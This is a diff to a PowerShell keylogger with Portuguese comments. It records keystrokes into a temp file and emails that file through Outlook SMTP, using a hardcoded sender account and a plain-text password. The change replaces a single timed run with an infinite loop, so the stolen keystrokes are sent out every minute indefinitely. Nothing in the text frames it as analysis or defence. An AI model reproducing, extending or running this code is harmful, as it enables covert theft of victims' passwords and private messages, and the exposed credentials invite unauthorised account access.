@@ -16,7 +16,6 @@ if ($handle -ne [IntPtr]::Zero) {
 }
 
 # Configurações de envio de e-mail
-$TimesToRun = 1
 $RunTimeP = 1 # Tempo em minutos
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
@@ -26,9 +25,6 @@ $body = "report"
 $SMTPServer = "smtp-mail.outlook.com" # SMTP do Outlook
 $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-
-$TimeStart = Get-Date
-$TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
 # Requer PowerShell versão 2
 function Start-Helper($Path="$env:temp\help.txt") {
@@ -48,8 +44,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
-        $Runner = 0
-        while ($TimesToRun -ge $Runner) {
+        while ($true) {
+            $TimeStart = Get-Date
+            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
             while ($TimeEnd -ge (Get-Date)) {
                 Start-Sleep -Milliseconds 40
                 
@@ -76,8 +73,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
             Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachments $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
             Remove-Item -Path $Path -Force
-            $Runner++
-            $TimeEnd = (Get-Date).AddMinutes($RunTimeP)
         }
     }
     finally {
